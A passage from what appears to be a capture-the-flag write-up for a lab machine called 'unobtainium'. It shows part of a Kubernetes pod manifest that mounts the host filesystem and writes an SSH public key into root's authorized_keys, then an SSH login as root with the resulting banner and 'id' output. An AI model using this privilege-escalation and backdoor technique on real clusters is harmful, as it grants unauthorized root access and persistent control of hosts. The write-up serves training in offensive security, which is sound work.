    args: [ "mkdir /host/root/.ssh; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC59U/K1yNxcN3a1QYJLtSg+k5linxm3BK7KkViCEwHqOvWhb38ZWGGPppmQKBdEWSproWo44R2ZtxQzTM0wK+TF2qcjBupywdvk2jCCtE58teq09qgpKdgjWQRW/Zb701X8rymjzzssCBVZKOHp2TfJY1w4t8MPNIg+0WxSxyZuH1pm/hFxBZykWJOTg1VkO+H799IB/e5GLEEonAsC/6c0rbFi+hEIRgzuXgA0f8JQ+7CLlcSY5XZnTeMAXtCLfkNKJPiIN0xelEZSM9X9T6rcIFr0RGZEOEqEAfcxBsCapLAf6oy8jofd4cR5N1SdeiCZfBo2Fz33WNQLecwQN1ea4qkKZgkC281FwBWl8AyquxrVPPPU4LhIglDawQpQPZyeYVmnyYGxXPqXqa7bNrn5B3x5e5jcj8caSw37/VLt4udmA3NNLfT9puEO4CRp7iJ6LYd4J9TCd+kKsGfiNM2+wq/AmBoKfO+4cfFvI4KaYQPgFBUWqf3Qfai5TfCuZE= jack@parrot' > /host/root/.ssh/authorized_keys" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /
```

This writes our ssh public key into roots authorized keys and we can ssh into the host as root

```
$ ssh -i root_key root@10.129.129.132
The authenticity of host '10.129.129.132 (10.129.129.132)' can't be established.
ECDSA key fingerprint is SHA256:o6fpbEjzA0EcxkYQiTKfYKrOSBGwIWuZoZOkFcXuwc8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.129.132' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 12 Apr 2021 11:09:14 AM BST

  System load:              1.0
  Usage of /:               63.6% of 13.22GB
  Memory usage:             29%
  Swap usage:               0%
  Processes:                320
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for ens192:  10.129.129.132
  IPv6 address for ens192:  dead:beef::250:56ff:feb9:a430

  => There are 24 zombie processes.


0 updates can be installed immediately.
0 of these updates are security updates.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb 22 00:08:29 2021
root@unobtainium:~# id
uid=0(root) gid=0(root) groups=0(root)
```
